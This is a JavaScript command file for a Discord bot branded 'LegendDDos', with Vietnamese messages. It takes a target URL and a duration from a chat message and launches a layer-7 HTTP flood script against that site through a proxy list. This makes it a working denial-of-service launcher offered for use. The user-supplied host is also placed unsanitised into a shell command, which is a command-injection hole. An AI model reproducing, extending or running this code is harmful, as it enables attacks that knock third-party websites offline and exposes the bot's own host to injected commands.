const Discord = require("discord.js");

exports.run = async (client, message, args) => {

const host = message.content.split (" ")[1]
const duration = message.content.split (" ")[2]
const ayarlar = require('../ayarlar.json');
var room = ayarlar.commandroom;
var version = ayarlar.versionbot;
var img = ayarlar.img;

if (message.channel.id != room) {
	return;
  }

// Example command
if(!args[0]) {
	const embed1 = new Discord.MessageEmbed()
	.setColor('RANDOM')
	.setTitle('CẢNH BÁO')
	.setDescription("`Mẫu lệnh tấn công .http-even <url> <time>`")
	.setFooter("Vui lòng không tấn công trang web của chính phủ!")
	message.channel.send(embed1);
	message.react('❌');
	return;
	}

if(!args[1]) {
	const embed1 = new Discord.MessageEmbed()
	.setColor('RANDOM')
	.setTitle('CẢNH BÁO')
	.setDescription("`Yêu cầu đồng chí ghi thời gian`")
	message.channel.send(embed1);
	message.react('❌');
	return;
  }

	var exec = require('child_process').exec
	exec(`node methods/L7/HTTP-EVEN.js ${host} proxies.txt ${duration} GET`, (error, stdout, stderr) => {
	});

	console.log('Một cuộc tấn công khởi chạy ID Discord:' +  message.guild.id)
	const embed = new Discord.MessageEmbed()
		.setColor('RANDOM')
		.setTitle(version)
		.setDescription("👨‍💻 Người dùng: `" + message.author.username + "` \n 🔗 Url: `" + host + "`\n \n 💥 Phương pháp: `HTTP EVEN`\n 🕒 Thời gian: `" + duration + "`")
		.setFooter('© » LegendDDos 2022-2023 make by HuyXingum8K#4933', img)
		.setImage(`https://cdn.discordapp.com/attachments/955732578072141850/1001105286993543231/LegendAttack.gif`)
	const countdownEmbed = new Discord.MessageEmbed()
		.setColor('RANDOM')
		.setTitle(version)
		.setDescription("ĐANG KIỂM TRA...")
		.setImage("https://i.gifer.com/FRKK.gif")
		.setFooter('© » LegendDDos 2022-2023 make by HuyXingum8K#4933', img)
  message.channel.send({ embed: countdownEmbed }).then((msg) => {
			setTimeout(function () {
				msg.edit(embed);
				message.react('✅');
			}, 3000)
		})
	}

exports.conf = {
  enabled: true,
  guildOnly: false,
  aliases: ['http-even'],
  permLevel: 0
}

exports.help = {
  name: 'http-even',
  description: 'Lệnh Tấn Công',
  usage: 'http-even'
}
